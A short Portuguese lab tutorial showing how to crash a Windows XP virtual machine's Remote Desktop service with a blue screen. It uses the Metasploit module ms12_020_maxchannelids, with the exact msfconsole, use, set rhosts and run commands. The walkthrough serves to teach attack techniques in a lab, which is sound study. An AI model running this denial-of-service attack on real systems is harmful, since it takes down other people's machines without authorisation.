## Ataques DoS no Windows RDP (tela azul)

### 1º - Abra o Windows e o Kali Linux na Virtual Machine (VM). 

Neste exemplo vou usar o Windows XP. 

&nbsp;

### 2º - Habilitar o acesso remoto. 

No Windows XP acessar na sequência: Painel de Controle > Conexões de Rede e de Internet > Área de Trabalho Remota. Na janela que aparecer marcar a opção "Permitir que usuários se conectem remotamente a este computador" > Clicar em Aplicar > Clicar em OK.

![habilitar acesso](https://i.imgur.com/YMj4CCf.jpeg)

&nbsp;

### 3º - Abrir o terminal do Windows e digitar o comando ipconfig para obter o número IP do Windows a ser explorado. 

![ip windows](https://i.imgur.com/hXDBpyH.jpeg)

&nbsp;

### 4º - Acessar o Metasploit no Terminal do Kali Linux

Comando: msfconsole

![msfconsole](https://i.imgur.com/LpWhgk8.jpeg)

&nbsp;

### 5º - Fazer uma busca rdp e encontrar o módulo DoS correto, que vamos utilizar para o ataque.

Comando: search rdp

![modulo dos](https://i.imgur.com/pJwAhkB.jpeg)

&nbsp;

### 6º - Entrar no módulo DoS (exploit) encontrado.

Comando: use auxiliary/dos/windows/rdp/ms12_020_maxchannelids

![use](https://i.imgur.com/3Nw6gSc.jpeg)

&nbsp;

### 7º - Setar o host remoto utilizando o ip do Windows

Comando: set rhosts nú.me.ro.ip

![set rhosts](https://i.imgur.com/6GbiGE6.jpeg) 

&nbsp;

### 8º - Rodar o comando run. Esse comando vai dar tela azul no Windows e vai reiniciar a máquina. 

Comando: run

![run](https://i.imgur.com/HLMF23C.jpeg)

&nbsp;
